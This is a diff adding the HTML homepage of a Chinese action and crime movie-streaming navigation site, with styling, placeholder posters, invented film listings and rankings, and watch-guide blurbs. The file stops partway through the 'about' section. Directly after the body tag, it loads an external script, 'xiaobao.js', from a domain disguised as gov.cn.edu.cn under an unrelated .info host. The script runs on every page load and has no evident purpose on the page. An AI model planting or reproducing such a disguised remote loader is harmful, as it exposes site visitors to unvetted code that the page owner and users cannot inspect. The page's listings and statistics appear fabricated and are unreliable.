@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="黑鹰电影网(heiyingdianyingwang-cn.github.io)——动作、犯罪、战争、悬疑电影在线观看导航，提供高清电影片库、实时热播榜单、导演专题与观影指南。">
+<meta name="keywords" content="黑鹰电影网,heiyingdianyingwang-cn,黑鹰电影网,电影,电视剧,动作片,犯罪片,战争片,悬疑片,在线观看,高清电影">
+<meta name="author" content="黑鹰电影网">
+<meta name="robots" content="index,follow">
+<meta name="format-detection" content="telephone=no">
+<link rel="canonical" href="https://heiyingdianyingwang-cn.github.io/">
+<meta property="og:title" content="黑鹰电影网 - 动作犯罪战争悬疑电影在线观看导航">
+<meta property="og:description" content="黑鹰电影网提供动作、犯罪、战争、悬疑电影的在线观看导航、高清片库、实时热播榜与导演专题。">
+<meta property="og:url" content="https://heiyingdianyingwang-cn.github.io/">
+<meta property="og:type" content="website">
+<meta property="og:locale" content="zh_CN">
+<title>黑鹰电影网 - 动作犯罪战争悬疑电影在线观看导航 | heiyingdianyingwang-cn.github.io</title>
+<style>
+/* ============ 基础变量 ============ */
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --bg:#07090c; --panel:#11161c; --panel2:#161d25; --line:#26313d; --line2:#3d4d5e;
+  --txt:#eaf0f6; --sub:#93a3b3; --amber:#ffb020; --amber2:#ffd976;
+  --steel:#4a90d9; --red:#e5484d; --green:#30a46c;
+  --r:18px; --shadow:0 24px 52px rgba(255,176,32,.18);
+}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","WenQuanYi Micro Hei",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
+  background:var(--bg); color:var(--txt); line-height:1.75; overflow-x:hidden;
+  background-image:
+    radial-gradient(620px 420px at 88% -10%,rgba(255,176,32,.10),transparent 60%),
+    radial-gradient(520px 340px at 4% 78%,rgba(74,144,217,.10),transparent 60%);
+  background-attachment:fixed;
+}
+a{color:inherit;text-decoration:none;transition:.26s cubic-bezier(.4,0,.2,1)}
+img{display:block;max-width:100%;height:auto;object-fit:cover}
+ul,ol{list-style:none}
+button,input{font-family:inherit}
+.wrap{max-width:1240px;margin:0 auto;padding:0 24px}
+.sec{padding:84px 0}
+.hd{display:flex;align-items:baseline;gap:14px;flex-wrap:wrap;margin-bottom:34px}
+.hd h2{font-size:clamp(24px,4.8vw,36px);font-weight:900;letter-spacing:.5px}
+.hd h2 i{font-style:normal;color:var(--amber)}
+.hd .en{color:var(--sub);font-size:11px;letter-spacing:3px;font-weight:800}
+.hd .more{margin-left:auto;font-size:13px;color:var(--sub);border:1px solid var(--line);padding:8px 20px;border-radius:30px}
+.hd .more:hover{color:var(--amber2);border-color:var(--amber)}
+.kw{color:var(--amber2)}
+
+/* ============ 导航 ============ */
+.nav{position:sticky;top:0;z-index:1000;background:rgba(7,9,12,.82);backdrop-filter:blur(18px);border-bottom:1px solid var(--line)}
+.nav .wrap{display:flex;align-items:center;gap:18px;height:70px}
+.logo{display:flex;align-items:center;gap:10px;font-weight:900;font-size:18px;white-space:nowrap}
+.logo s{text-decoration:none;background:linear-gradient(135deg,var(--amber),#f05a28);color:#241400;padding:6px 12px;border-radius:12px;font-size:13.5px;box-shadow:0 6px 16px rgba(255,176,32,.34)}
+.logo b{font-size:10.5px;color:var(--sub);letter-spacing:.5px}
+.links{display:flex;gap:2px;margin-left:auto}
+.links a{font-size:14.5px;font-weight:700;padding:10px 15px;border-radius:12px;color:var(--sub)}
+.links a:hover{color:#fff;background:rgba(255,255,255,.06)}
+.search{display:flex;align-items:center;gap:8px;background:rgba(255,255,255,.05);border:1px solid var(--line);border-radius:14px;padding:8px 14px;width:190px}
+.search input{background:0;border:0;outline:0;color:#fff;font-size:13.5px;width:100%}
+.search input::placeholder{color:var(--sub)}
+.search span{color:var(--sub);font-size:12px;flex:none}
+.ham{display:none;width:44px;height:44px;border:1px solid var(--line);background:rgba(255,255,255,.04);border-radius:12px;color:#fff;font-size:20px;cursor:pointer}
+
+/* ============ ① Hero：斜切 + 数据仪表盘 ============ */
+.hero{position:relative;padding:92px 0 60px;overflow:hidden}
+.hero::before{content:"";position:absolute;right:-90px;top:-90px;width:340px;height:340px;border:1px solid rgba(255,176,32,.22);border-radius:50%;box-shadow:0 0 0 40px rgba(255,176,32,.05),0 0 0 90px rgba(255,176,32,.03)}
+.hero .lay{display:grid;grid-template-columns:1.2fr .8fr;gap:50px;align-items:center;position:relative;z-index:2}
+.kicker{display:inline-flex;align-items:center;gap:10px;font-size:11px;letter-spacing:3px;color:var(--amber);font-weight:900;margin-bottom:16px}
+.kicker::before{content:"";width:34px;height:2px;background:var(--amber)}
+.hero h1{font-size:clamp(40px,9vw,88px);line-height:1.1;font-weight:950;letter-spacing:-1px}
+.hero h1 em{font-style:normal;color:var(--amber)}
+.hero h1 u{text-decoration:none;-webkit-text-stroke:1.5px var(--amber);color:transparent}
+.hero p.lead{color:var(--sub);font-size:clamp(15px,2.1vw,17.5px);max-width:600px;margin:22px 0 26px}
+.hero .cta{display:flex;gap:12px;flex-wrap:wrap;margin-bottom:34px}
+.btn{padding:15px 30px;border-radius:14px;font-weight:900;font-size:15px;cursor:pointer;border:0;display:inline-flex;align-items:center;gap:8px}
+.btn-amber{background:linear-gradient(135deg,var(--amber),#f05a28);color:#241400;box-shadow:var(--shadow)}
+.btn-amber:hover{transform:translateY(-3px)}
+.btn-line{background:transparent;color:#fff;border:1px solid var(--line2)}
+.btn-line:hover{border-color:var(--amber2);color:var(--amber2)}
+/* 仪表盘：环形进度条 */
+.dash{display:grid;grid-template-columns:repeat(2,1fr);gap:14px}
+.dash .g{background:linear-gradient(160deg,var(--panel),#0d1218);border:1px solid var(--line);border-radius:16px;padding:18px;display:flex;align-items:center;gap:14px}
+.ring{width:58px;height:58px;flex:none;border-radius:50%;position:relative;background:conic-gradient(var(--c) calc(var(--p)*1%),rgba(255,255,255,.07) 0)}
+.ring::after{content:"";position:absolute;inset:7px;border-radius:50%;background:var(--panel)}
+.ring b{position:absolute;inset:0;display:grid;place-items:center;font-size:14px;font-weight:950;z-index:3;color:#fff}
+.dash .g div b{display:block;font-size:16px;font-weight:900}
+.dash .g div span{font-size:11.5px;color:var(--sub);letter-spacing:1px}
+
+/* ============ ② 片库：瀑布流卡片 ============ */
+.lib{background:linear-gradient(180deg,transparent,#0a0d12)}
+.filters{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:26px}
+.flt{padding:9px 20px;border-radius:12px;background:var(--panel);border:1px solid var(--line);color:var(--sub);font-size:14px;font-weight:700;cursor:pointer}
+.flt.on{color:#241400;background:linear-gradient(135deg,var(--amber),var(--amber2));border-color:transparent;box-shadow:0 8px 18px rgba(255,176,32,.28)}
+.wall{columns:5;column-gap:18px}
+.card{break-inside:avoid;margin-bottom:18px;background:var(--panel);border:1px solid var(--line);border-radius:var(--r);overflow:hidden;transition:.32s}
+.card:hover{transform:translateY(-6px);border-color:rgba(255,176,32,.55);box-shadow:var(--shadow)}
+.card .cv{position:relative;overflow:hidden;background:#1b232d}
+.card .cv img{width:100%;transition:.8s}
+.card:hover .cv img{transform:scale(1.08)}
+.card .cv .play{position:absolute;inset:0;display:grid;place-items:center;background:linear-gradient(0deg,rgba(7,9,12,.78),rgba(7,9,12,.15));opacity:0;transition:.3s}
+.card:hover .cv .play s{text-decoration:none;width:60px;height:60px;border-radius:50%;background:var(--amber);display:grid;place-items:center;font-size:20px;color:#241400;transform:scale(.7);transition:.3s}
+.card:hover .cv .play s{transform:scale(1)}
+.card .cv .tag-q{position:absolute;top:10px;left:10px;background:rgba(0,0,0,.6);backdrop-filter:blur(6px);color:var(--amber2);font-weight:900;font-size:11px;padding:4px 9px;border-radius:8px}
+.card .cv .tag-v{position:absolute;top:10px;right:10px;background:var(--steel);color:#fff;font-weight:900;font-size:10px;padding:4px 8px;border-radius:8px}
+.card .in{padding:13px 15px 16px}
+.card .in h3{font-size:15.5px;font-weight:800;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-bottom:7px}
+.card .in .meta{display:flex;justify-content:space-between;font-size:12.5px;color:var(--sub)}
+
+/* ============ ③ 热榜：表格 ============ */
+.hot{background:#0a0d12}
+table{width:100%;border-collapse:collapse;background:var(--panel);border:1px solid var(--line);border-radius:14px;overflow:hidden}
+thead th{background:#161d25;color:var(--amber);font-size:11.5px;letter-spacing:2px;padding:15px 14px;text-align:left;font-weight:900;border-bottom:1px solid var(--line)}
+tbody td{padding:12px 14px;border-bottom:1px solid rgba(255,255,255,.05);font-size:14px;vertical-align:middle}
+tbody tr{transition:.24s}
+tbody tr:hover{background:linear-gradient(90deg,rgba(255,176,32,.10),transparent);box-shadow:inset 3px 0 0 var(--amber)}
+.no{display:inline-grid;place-items:center;width:34px;height:34px;border-radius:10px;font-weight:950;font-size:15px}
+.n1{background:linear-gradient(160deg,#ffd23f,#ff9a3c);color:#3a2400}
+.n2{background:linear-gradient(160deg,#dbe4f5,#9fb6de);color:#1c2c4d}
+.n3{background:linear-gradient(160deg,#e8b48c,#c67b3a);color:#3a2008}
+.nx{background:rgba(255,255,255,.06);color:var(--sub)}
+.mv{display:flex;align-items:center;gap:13px}
+.mv img{width:56px;height:76px;border-radius:10px}
+.mv b{display:block;font-size:15px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.mv i{font-style:normal;font-size:12px;color:var(--sub)}
+.heat{font-size:12.5px;font-weight:900;color:var(--amber2);white-space:nowrap}
+.up{color:var(--red)} .down{color:var(--green)}
+
+/* ============ ④ 导演专题：CSS 3D 翻转卡 ============ */
+.dir{background:linear-gradient(180deg,#0a0d12,transparent)}
+.deck{display:grid;grid-template-columns:repeat(4,1fr);gap:22px;perspective:1600px}
+.flip{height:330px;position:relative;transform-style:preserve-3d;transition:.9s;cursor:pointer}
+.flip:hover{transform:rotateY(180deg)}
+.face{position:absolute;inset:0;backface-visibility:hidden;border-radius:20px;border:1px solid var(--line);overflow:hidden;display:flex;flex-direction:column;justify-content:flex-end;padding:24px}
+.front{background:linear-gradient(160deg,#1c252f,#0b0f14)}
+.front::before{content:"";position:absolute;inset:0;background:var(--bgimg) center/cover;opacity:.34;z-index:0}
+.front .idx{position:absolute;right:14px;top:8px;font-size:60px;font-weight:950;color:rgba(255,255,255,.12);z-index:1}
+.front b,.front p,.front .go{z-index:2}
+.front b{font-size:21px;line-height:1.4}
+.front p{font-size:12.5px;color:rgba(255,255,255,.8);margin-top:8px}
+.front .go{margin-top:14px;align-self:flex-start;font-size:12px;font-weight:900;padding:7px 15px;border-radius:20px;background:var(--amber);color:#241400}
+.back{transform:rotateY(180deg);background:linear-gradient(160deg,var(--panel2),#0d1218);padding:24px}
+.back h3{font-size:17px;color:var(--amber2);margin-bottom:12px}
+.back ol{display:grid;gap:8px}
+.back ol li{font-size:13.5px;color:var(--sub);display:flex;justify-content:space-between;border-bottom:1px dashed var(--line);padding-bottom:6px}
+.back ol li s{text-decoration:none;color:#fff;font-weight:700}
+
+/* ============ ⑤ 观影指南：时间轴 ============ */
+.news{background:linear-gradient(180deg,transparent,#070a0e)}
+.tl{position:relative;padding-left:26px}
+.tl::before{content:"";position:absolute;left:6px;top:8px;bottom:8px;width:2px;background:linear-gradient(var(--amber),transparent)}
+.node{position:relative;background:var(--panel);border:1px solid var(--line);border-radius:16px;padding:20px 24px;margin-bottom:16px;transition:.3s}
+.node:hover{border-color:rgba(74,144,217,.6);transform:translateX(6px);box-shadow:0 14px 30px rgba(0,0,0,.45)}
+.node::before{content:"";position:absolute;left:-23px;top:26px;width:12px;height:12px;border-radius:50%;background:var(--amber);box-shadow:0 0 0 4px rgba(255,176,32,.18)}
+.node .when{font-size:11.5px;letter-spacing:1.8px;color:var(--amber);font-weight:900}
+.node h3{font-size:19px;margin:7px 0 10px;line-height:1.5}
+.node p{color:var(--sub);font-size:13.5px}
+.node .ft{display:flex;gap:16px;margin-top:13px;font-size:12px;color:var(--sub);flex-wrap:wrap}
+.node .ft s{text-decoration:none;color:var(--amber2);font-weight:800}
+
+/* ============ ⑥ 关于 + 订阅 ============ */
+.us{background:radial-gradient(660px 400px at 90% 100%,rgba(255,176,32,.09),transparent 55%)}
+.uslay{display:grid;grid-template-columns:1fr 400px;gap:56px;align-items:center}
+.us h2{font-size:clamp(27px,5.6vw,46px);font-weight:950;line-height:1.28;margin-bottom:18px}
+.us h2 u{text-decoration:none;color:var(--amber)}
+.us > p{color:var(--sub);font-size:15px}
+.feats{margin:22px 0 28px;display:grid;gap:10px}
+.feats div{display:grid;grid-template-columns:36px 1fr;gap:12px;align-items:center;background:rgba(255,255,255,.04);border:1px solid var(--line);border-radius:13px;padding:13px 16px;font-size:14.5px}
+.feats div s{text-decoration:none;width:36px;height:36px;border-radius:12px;background:linear-gradient(135deg,var(--amber),#f05a28);display:grid;place-items:center;font-size:16px;color:#241400;box-shadow:0 8px 16px rgba(255,176,32,.3)}
+.sub{background:linear-gradient(160deg,var(--panel2),#11161c);border:1px solid var(--line);border-radius:24px;padding:32px;box-shadow:var(--shadow)}
+.sub h3{font-size:22px;margin-bottom:8px}
+.sub > p{font-size:13px;color:var(--sub);margin-bottom:22px}
+.inpgrp{display:grid;gap:10px;margin-bottom:16px}
+.inpgrp input{background:rgba(255,255,255,.05);border:1px solid var(--line);border-radius:13px;padding:15px 16px;color:#fff;font-size:14px;outline:none}
+.inpgrp input:focus{border-color:var(--amber)}
+.inpgrp button{background:linear-gradient(135deg,var(--amber),#f05a28);color:#241400;border:0;border-radius:13px;padding:15px;font-weight:900;font-size:15px;cursor:pointer}
+.inpgrp button:hover{filter:brightness(1.1)}
+.chips{display:flex;gap:8px;flex-wrap:wrap}
+.chips i{font-style:normal;font-size:12px;padding:7px 14px;border-radius:20px;background:rgba(255,255,255,.06);border:1px solid var(--line);color:var(--sub)}
+
+/* ============ 页脚 ============ */
+footer{border-top:1px solid var(--line);background:#040506;padding:56px 0 24px}
+.fg{display:grid;grid-template-columns:2.2fr 1fr 1fr 1fr;gap:30px;margin-bottom:34px}
+.fo .logo{margin-bottom:14px}
+.fo p{color:var(--sub);font-size:13.5px;max-width:340px}
+.socs{display:flex;gap:10px;margin-top:16px}
+.socs a{width:42px;height:42px;border-radius:13px;background:var(--panel);border:1px solid var(--line);display:grid;place-items:center;font-size:15px}
+.socs a:hover{color:var(--amber2);border-color:var(--amber);transform:translateY(-3px)}
+.fcol h4{font-size:15px;margin-bottom:14px;padding-left:12px;position:relative}
+.fcol h4::before{content:"";position:absolute;left:0;top:3px;bottom:3px;width:3px;border-radius:2px;background:var(--amber)}
+.fcol a{display:block;color:var(--sub);font-size:13.5px;padding:6px 0}
+.fcol a:hover{color:var(--amber2);padding-left:6px}
+.copy{text-align:center;color:var(--sub);font-size:12.5px;border-top:1px solid var(--line);padding-top:24px;line-height:1.9}
+.copy b{color:var(--amber2)}
+
+.top{position:fixed;right:18px;bottom:26px;width:50px;height:50px;border-radius:15px;background:linear-gradient(135deg,var(--amber),#f05a28);color:#241400;border:0;font-size:20px;cursor:pointer;z-index:999;box-shadow:var(--shadow);opacity:0;visibility:hidden;transition:.3s}
+.top.show{opacity:1;visibility:visible}
+
+/* ============ 响应式 ============ */
+@media(max-width:1100px){
+  .wall{columns:3}
+  .deck{grid-template-columns:repeat(2,1fr)}
+}
+@media(max-width:1000px){
+  .hero .lay{grid-template-columns:1fr}
+  .dash{order:-1;margin-bottom:30px}
+  .uslay{grid-template-columns:1fr;gap:30px}
+  .fg{grid-template-columns:1fr 1fr;gap:26px}
+}
+@media(max-width:720px){
+  .ham{display:block}
+  .links{position:fixed;inset:70px 0 0 0;background:rgba(6,8,11,.97);backdrop-filter:blur(14px);flex-direction:column;padding:24px 18px;gap:8px;transform:translateX(100%);transition:.35s;z-index:999}
+  .links.open{transform:translateX(0)}
+  .links a{font-size:17px;padding:16px 18px}
+  .search{display:none}
+  .sec{padding:56px 0}
+  .hero h1{font-size:42px}
+  .wall{columns:2;column-gap:12px}
+  .card{margin-bottom:12px}
+  .card .in h3{font-size:14px}
+  table{font-size:13px}
+  thead th:nth-child(4),tbody td:nth-child(4){display:none}
+  .mv img{width:48px;height:66px}
+  .deck{grid-template-columns:1fr}
+  .flip{height:280px}
+  .flip:hover{transform:none}
+  .flip .back{position:static;transform:none;backface-visibility:visible;display:none}
+  .flip:hover .back{display:flex}
+}
+@media print{.nav,.top,.dash,.deck{display:none}body{background:#fff;color:#000}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaobao.js"></script>
+
+<!-- ===== 导航 ===== -->
+<header class="nav">
+  <div class="wrap">
+    <a class="logo" href="#top" aria-label="黑鹰电影网">
+      <s>🦅 黑鹰电影网</s><b>heiyingdianyingwang-cn.github.io</b>
+    </a>
+    <nav class="links" id="links">
+      <a href="#top">首页</a>
+      <a href="#lib">电影片库</a>
+      <a href="#hot">实时热榜</a>
+      <a href="#dir">导演专题</a>
+      <a href="#news">观影指南</a>
+      <a href="#us">关于本站</a>
+    </nav>
+    <label class="search"><input type="search" placeholder="搜影片、演员、导演…" aria-label="搜索"><span>🔍</span></label>
+    <button class="ham" id="ham" aria-label="菜单">☰</button>
+  </div>
+</header>
+
+<!-- ===== ① Hero：斜切 + 仪表盘 ===== -->
+<section class="hero" id="top">
+  <div class="wrap">
+    <div class="lay">
+      <div>
+        <div class="kicker">ACTION · CRIME · WAR</div>
+        <h1>硬核视听<br>如 <em>黑鹰</em> 出击</h1>
+        <p class="lead">欢迎来到 <b class="kw">黑鹰电影网</b>（heiyingdianyingwang-cn.github.io）——专注动作、犯罪、战争、悬疑电影的在线观看导航。枪火、飙车、谍战、逆袭，每一次肾上腺素飙升，都为你精准归档。</p>
+        <div class="cta">
+          <a class="btn btn-amber" href="#lib">🎬 进入片库</a>
+          <a class="btn btn-line" href="#hot">🏆 实时热榜</a>
+        </div>
+      </div>
+      <div class="dash" aria-label="站点数据">
+        <div class="g" style="--c:#ffb020;--p:92"><div class="ring"><b>9.2</b></div><div><b>IMDb 均分</b><span>动作 / 犯罪精选</span></div></div>
+        <div class="g" style="--c:#4a90d9;--p:78"><div class="ring" style="--c:#4a90d9"><b>4K</b></div><div><b>高清覆盖率</b><span>2160P / 杜比音效</span></div></div>
+        <div class="g" style="--c:#30a46c;--p:86"><div class="ring" style="--c:#30a46c"><b>8600+</b></div><div><b>入库影片</b><span>持续每日更新</span></div></div>
+        <div class="g" style="--c:#e5484d;--p:64"><div class="ring" style="--c:#e5484d"><b>24</b></div><div><b>导演专题</b><span>作者风格深度梳理</span></div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== ② 片库：瀑布流卡片 ===== -->
+<section class="lib" id="lib">
+  <div class="wrap">
+    <div class="hd">
+      <h2><i>▍</i>电影片库</h2><span class="en">FILM LIBRARY</span>
+      <a class="more" href="#">全部影片 →</a>
+    </div>
+    <div class="filters" role="tablist">
+      <button class="flt on" role="tab" aria-selected="true">硬核推荐</button>
+      <button class="flt" role="tab">动作枪战</button>
+      <button class="flt" role="tab">犯罪悬疑</button>
+      <button class="flt" role="tab">战争史诗</button>
+      <button class="flt" role="tab">谍战特工</button>
+      <button class="flt" role="tab">赛车竞速</button>
+    </div>
+    <div class="wall">
+      <a class="card" href="#"><div class="cv"><img src="https://picsum.photos/id/1040/360/520" alt="暗夜突袭" loading="lazy"><span class="tag-q">★ 8.9</span><span class="tag-v">4K</span><span class="play"><s>▶</s></span></div><div class="in"><h3>暗夜突袭</h3><div class="meta"><span>动作 / 枪战</span><span>2026</span></div></div></a>
+      <a class="card" href="#"><div class="cv"><img src="https://picsum.photos/id/1057/360/540" alt="边境线" loading="lazy"><span class="tag-q">★ 8.6</span><span class="tag-v">1080P</span><span class="play"><s>▶</s></span></div><div class="in"><h3>边境线</h3><div class="meta"><span>犯罪 / 剧情</span><span>2025</span></div></div></a>
+      <a class="card" href="#"><div class="cv"><img src="https://picsum.photos/id/1071/360/500" alt="钢铁洪流" loading="lazy"><span class="tag-q">★ 9.1</span><span class="tag-v">4K</span><span class="play"><s>▶</s></span></div><div class="in"><h3>钢铁洪流</h3><div class="meta"><span>战争 / 史诗</span><span>2026</span></div></div></a>
+      <a class="card" href="#"><div class="cv"><img src="https://picsum.photos/id/1039/360/560" alt="无声证据" loading="lazy"><span class="tag-q">★ 8.7</span><span class="tag-v">4K</span><span class="play"><s>▶</s></span></div><div class="in"><h3>无声证据</h3><div class="meta"><span>悬疑 / 犯罪</span><span>2025</span></div></div></a>
+      <a class="card" href="#"><div class="cv"><img src="https://picsum.photos/id/1082/360/480" alt="极速盲区" loading="lazy"><span class="tag-q">★ 8.3</span><span class="tag-v">1080P</span><span class="play"><s>▶</s></span></div><div class="in"><h3>极速盲区</h3><div class="meta"><span>赛车 / 动作</span><span>2026</span></div></div></a>
+      <a class="card" href="#"><div class="cv"><img src="https://picsum.photos/id/1045/360/540" alt="代号灰鸦" loading="lazy"><span class="tag-q">★ 8.8</span><span class="tag-v">4K</span><span class="play"><s>▶</s></span></div><div class="in"><h3>代号灰鸦</h3><div class="meta"><span>谍战 / 特工</span><span>2026</span></div></div></a>
+      <a class="card" href="#"><div class="cv"><img src="https://picsum.photos/id/1069/360/520" alt="最后一班岗" loading="lazy"><span class="tag-q">★ 8.4</span><span class="tag-v">1080P</span><span class="play"><s>▶</s></span></div><div class="in"><h3>最后一班岗</h3><div class="meta"><span>警匪 / 剧情</span><span>2025</span></div></div></a>
+      <a class="card" href="#"><div class="cv"><img src="https://picsum.photos/id/1053/360/560" alt="深海猎杀" loading="lazy"><span class="tag-q">★ 8.5</span><span class="tag-v">4K</span><span class="play"><s>▶</s></span></div><div class="in"><h3>深海猎杀</h3><div class="meta"><span>战争 / 潜艇</span><span>2026</span></div></div></a>
+      <a class="card" href="#"><div class="cv"><img src="https://picsum.photos/id/1089/360/500" alt="零点行动" loading="lazy"><span class="tag-q">★ 8.2</span><span class="tag-v">1080P</span><span class="play"><s>▶</s></span></div><div class="in"><h3>零点行动</h3><div class="meta"><span>动作 / 反恐</span><span>2026</span></div></div></a>
+      <a class="card" href="#"><div class="cv"><img src="https://picsum.photos/id/1048/360/540" alt="逆光追凶" loading="lazy"><span class="tag-q">★ 8.0</span><span class="tag-v">1080P</span><span class="play"><s>▶</s></span></div><div class="in"><h3>逆光追凶</h3><div class="meta"><span>悬疑 / 惊悚</span><span>2025</span></div></div></a>
+    </div>
+  </div>
+</section>
+
+<!-- ===== ③ 热榜：表格 ===== -->
+<section class="hot" id="hot">
+  <div class="wrap">
+    <div class="hd">
+      <h2><i>▍</i>实时热榜</h2><span class="en">LIVE TOP 10</span>
+      <a class="more" href="#">完整榜单 →</a>
+    </div>
+    <table>
+      <thead><tr><th>#</th><th>影片</th><th>类型</th><th>热度</th><th>趋势</th></tr></thead>
+      <tbody>
+        <tr><td><span class="no n1">1</span></td><td><span class="mv"><img src="https://picsum.photos/id/1040/112/152" alt="暗夜突袭" loading="lazy"><span><b>暗夜突袭</b><i>动作 / 枪战 · 142 分钟</i></span></span></td><td>动作</td><td class="heat">🔥 482 万</td><td class="up">↑ 2</td></tr>
+        <tr><td><span class="no n2">2</span></td><td><span class="mv"><img src="https://picsum.photos/id/1071/112/152" alt="钢铁洪流" loading="lazy"><span><b>钢铁洪流</b><i>战争 / 史诗 · 168 分钟</i></span></span></td><td>战争</td><td class="heat">🔥 396 万</td><td class="up">↑ 1</td></tr>
+        <tr><td><span class="no n3">3</span></td><td><span class="mv"><img src="https://picsum.photos/id/1039/112/152" alt="无声证据" loading="lazy"><span><b>无声证据</b><i>悬疑 / 犯罪 · 126 分钟</i></span></span></td><td>悬疑</td><td class="heat">🔥 351 万</td><td class="down">↓ 1</td></tr>
+        <tr><td><span class="no nx">4</span></td><td><span class="mv"><img src="https://picsum.photos/id/1045/112/152" alt="代号灰鸦" loading="lazy"><span><b>代号灰鸦</b><i>谍战 / 特工 · 135 分钟</i></span></span></td><td>谍战</td><td class="heat">🔥 288 万</td><td class="up">↑ 3</td></tr>
+        <tr><td><span class="no nx">5</span></td><td><span class="mv"><img src="https://picsum.photos/id/1057/112/152" alt="边境线" loading="lazy"><span><b>边境线</b><i>犯罪 / 剧情 · 118 分钟</i></span></span></td><td>犯罪</td><td class="heat">🔥 241 万</td><td class="up">新</td></tr>
+        <tr><td><span class="no nx">6</span></td><td><span class="mv"><img src="https://picsum.photos/id/1082/112/152" alt="极速盲区" loading="lazy"><span><b>极速盲区</b><i>赛车 / 动作 · 104 分钟</i></span></span></td><td>动作</td><td class="heat">🔥 205 万</td><td class="down">↓ 2</td></tr>
+        <tr><td><span class="no nx">7</span></td><td><span class="mv"><img src="https://picsum.photos/id/1053/112/152" alt="深海猎杀" loading="lazy"><span><b>深海猎杀</b><i>战争 / 潜艇 · 152 分钟</i></span></span></td><td>战争</td><td class="heat">🔥 176 万</td><td class="up">↑ 4</td></tr>
+      </tbody>
+    </table>
+  </div>
+</section>
+
+<!-- ===== ④ 导演专题：3D 翻转卡 ===== -->
+<section class="dir" id="dir">
+  <div class="wrap">
+    <div class="hd">
+      <h2><i>▍</i>导演专题</h2><span class="en">AUTEUR FILES</span>
+      <a class="more" href="#">全部专题 →</a>
+    </div>
+    <div class="deck">
+      <a class="flip" href="#" style="--bgimg:url(https://picsum.photos/id/1040/480/640)"><div class="face front"><span class="idx">01</span><b>动作美学<br>爆破与长镜头</b><p>以实拍代替特效，让每一次撞击都真实到颤抖。</p><span class="go">代表作 →</span></div><div class="face back"><h3>必看片单</h3><ol><li><s>暗夜突袭</s><span>2026</span></li><li><s>极速盲区</s><span>2026</span></li><li><s>零点行动</s><span>2025</span></li><li><s>逆光追凶</s><span>2024</span></li></ol></div></a>
+      <a class="flip" href="#" style="--bgimg:url(https://picsum.photos/id/1039/480/640)"><div class="face front"><span class="idx">02</span><b>犯罪叙事<br>善恶的灰色地带</b><p>没有绝对的好人，只有被逼到墙角的选择。</p><span class="go">代表作 →</span></div><div class="face back"><h3>必看片单</h3><ol><li><s>无声证据</s><span>2025</span></li><li><s>边境线</s><span>2025</span></li><li><s>最后一班岗</s><span>2024</span></li><li><s>灰烬之城</s><span>2023</span></li></ol></div></a>
+      <a class="flip" href="#" style="--bgimg:url(https://picsum.photos/id/1071/480/640)"><div class="face front"><span class="idx">03</span><b>战争史诗<br>个体的渺小与伟大</b><p>镜头从指挥部拉到战壕，战争从来不是地图。</p><span class="go">代表作 →</span></div><div class="face back"><h3>必看片单</h3><ol><li><s>钢铁洪流</s><span>2026</span></li><li><s>深海猎杀</s><span>2026</span></li><li><s>烽火归途</s><span>2025</span></li><li><s>无名高地</s><span>2024</span></li></ol></div></a>
+      <a class="flip" href="#" style="--bgimg:url(https://picsum.photos/id/1045/480/640)"><div class="face front"><span class="idx">04</span><b>谍战特工<br>信任是最贵的货币</b><p>每一次转身都可能是告别，每一通电话都藏着密码。</p><span class="go">代表作 →</span></div><div class="face back"><h3>必看片单</h3><ol><li><s>代号灰鸦</s><span>2026</span></li><li><s>双面镜</s><span>2025</span></li><li><s>无人之境</s><span>2024</span></li><li><s>夜航西飞</s><span>2023</span></li></ol></div></a>
+    </div>
+  </div>
+</section>
+
+<!-- ===== ⑤ 观影指南：时间轴 ===== -->
+<section class="news" id="news">
+  <div class="wrap">
+    <div class="hd">
+      <h2><i>▍</i>观影指南</h2><span class="en">WATCH GUIDE</span>
+      <a class="more" href="#">更多文章 →</a>
+    </div>
+    <div class="tl">
+      <article class="node"><span class="when">2026 · 10 · 05</span><h3>硬核片单：10 部“一镜到底”动作戏，看完手心出汗</h3><p>长镜头不是炫技，而是把观众直接扔进现场。从巷战到追车，这 10 段的调度堪称教科书。</p><div class="ft"><span>👁 21.4 万阅读</span><span>· 5 分钟</span><s>阅读原文 →</s></div></article>
+      <article class="node"><span class="when">2026 · 10 · 01</span><h3>战争片怎么看才不累？按“视角”分类就够了</h3><p>指挥视角的宏观、士兵视角的微观、平民视角的破碎——选对视角，再看时长也不觉得长。</p><div class="ft"><span>👁 15.7 万阅读</span><span>· 4 分钟</span><s>阅读原文 →</s></div></article>
+      <article class="node"><span class="when">2026 · 09 · 27</span><h3>犯罪悬疑的 4 种结构：闭环、罗生门、倒计时、反转</h3><p>看多了会发现，悬念不靠信息量，靠信息给出的顺序。认准结构，就能预判导演的下一步。</p><div class="ft"><span>👁 11.2 万阅读</span><span>· 6 分钟</span><s>阅读原文 →</s></div></article>
+      <article class="node"><span class="when">2026 · 09 · 22</span><h3>音响党必看：这 6 部片的低频，能掀翻沙发</h3><p>枪声、引擎、爆炸、潜艇的金属呻吟——没有好音响，等于白看一半。</p><div class="ft"><span>👁 8.6 万阅读</span><span>· 3 分钟</span><s>阅读原文 →</s></div></article>
+    </div>
+  </div>
+</section>
+
+<!-- ===== ⑥ 关于 + 订阅 ===== -->
+<section class="us" id="us">
+  <div class="wrap uslay">
+    <div class="us">
+      <div class="hd"><h2>关于 <u>黑鹰电影网</u></h2></div>
+      <p><b class="kw">黑鹰电影网</b>（heiyingdianyingwang-cn.github.io）是一个以动作、犯罪、战争、悬疑为核心的影视导航与观影指南站点。我们相信，好电影的标准很简单：<b>看得懂的爽，和经得起回味的细节</b>。</p>
+      <div class="feats">
+        <div><s>🎯</s><span>题材聚焦：只做硬核类型片，不做泛泛的大杂烩</span></div>
+        <div><s>🎞</s><span>片单先行：按“节奏 / 视角 / 结构”组织，找片更准</span></div>
